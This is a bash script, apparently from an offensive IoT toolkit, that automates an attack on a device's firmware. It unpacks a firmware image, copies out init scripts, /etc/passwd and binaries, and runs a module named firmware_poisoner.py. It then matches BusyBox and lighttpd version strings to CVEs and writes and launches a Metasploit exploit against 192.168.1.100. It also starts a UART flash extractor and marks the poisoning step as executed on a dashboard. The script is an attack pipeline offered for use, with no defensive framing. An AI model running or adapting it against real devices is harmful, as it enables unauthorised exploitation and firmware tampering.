#!/bin/bash

FIRMWARE_IMAGE="firmware/image.bin"
UNPACK_DIR="firmware/unpacked"
REPORT_FILE="reports/unpack_report.txt"
EXPORT_DIR="reports/firmware_static_extract"
TRIGGER_FILE="dashboard/trigger_firmware_poison.json"
CVE_ALERT_FILE="dashboard/alert_cves.json"
MSF_SCRIPT="firmware/autopwn.rc"

TOOLS=("binwalk" "unsquashfs" "python3" "msfconsole")

echo "[*] Checking dependencies..."
for tool in "${TOOLS[@]}"; do
    if ! command -v $tool &>/dev/null; then
        echo "[!] $tool not found. Please install it."
        exit 1
    fi
done

echo "[*] Verifying firmware image..."
if [ ! -f "$FIRMWARE_IMAGE" ]; then
    echo "[!] Firmware image not found at $FIRMWARE_IMAGE"
    exit 1
fi

mkdir -p "$UNPACK_DIR" "$EXPORT_DIR" "reports" "dashboard" "firmware"

echo "[+] Running binwalk extraction..."
binwalk --extract --directory="$UNPACK_DIR" "$FIRMWARE_IMAGE" > "$REPORT_FILE"

echo "[+] Searching for SquashFS..."
SQUASHFS_FILE=$(find "$UNPACK_DIR" -type f -name 'squashfs-root' -o -name '*.squashfs' | head -n 1)

if [ -n "$SQUASHFS_FILE" ]; then
    echo "[+] Extracting SquashFS..."
    unsquashfs -d "$UNPACK_DIR/squashfs" "$SQUASHFS_FILE" >> "$REPORT_FILE" 2>&1
else
    echo "[!] No SquashFS found. Exiting."
    exit 1
fi

echo "[+] Exporting files for static analysis..."
find "$UNPACK_DIR/squashfs" -type f \( -name "rcS" -o -name "init" -o -path "*/etc/passwd" -o -path "*/bin/*" \) -exec cp --parents {} "$EXPORT_DIR" \; >> "$REPORT_FILE" 2>/dev/null

echo "[+] Running firmware_poisoner.py..."
python3 modules/firmware/firmware_poisoner.py

echo "[+] Scanning for known vulnerable components..."
STRINGS=$(strings "$FIRMWARE_IMAGE")
CVE_FOUND=()

if echo "$STRINGS" | grep -q "busybox v1.20.2"; then
    CVE_FOUND+=("CVE-2013-1813")
fi
if echo "$STRINGS" | grep -q "lighttpd/1.4.31"; then
    CVE_FOUND+=("CVE-2014-2323")
fi

if [ ${#CVE_FOUND[@]} -gt 0 ]; then
    echo "[!] CVEs matched: ${CVE_FOUND[*]}"
    echo "[+] Generating Metasploit script..."

    echo "use exploit/linux/http/lighttpd_mod_ssi" > "$MSF_SCRIPT"
    echo "set RHOST 192.168.1.100" >> "$MSF_SCRIPT"
    echo "set TARGETURI /" >> "$MSF_SCRIPT"
    echo "run" >> "$MSF_SCRIPT"

    echo "[+] Launching Metasploit with CVE PoC..."
    msfconsole -r "$MSF_SCRIPT" >> "$REPORT_FILE" 2>&1 &

    echo "[+] Alerting dashboard with CVEs..."
    cat <<EOF > "$CVE_ALERT_FILE"
{
  "type": "cve_alert",
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")",
  "cves": ["${CVE_FOUND[@]}"]
}
EOF
fi

echo "[+] Triggering UART flash via uart_extractor.py..."
python3 modules/firmware/uart_extractor.py >> "$REPORT_FILE" 2>&1 &

echo "[+] Setting dashboard trigger for firmware_poisoner..."
cat <<EOF > "$TRIGGER_FILE"
{
  "module": "firmware_poisoner.py",
  "status": "executed",
  "timestamp": "$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
}
EOF

echo "[✓] Completed. Logs: $REPORT_FILE | CVEs: ${CVE_FOUND[*]}"
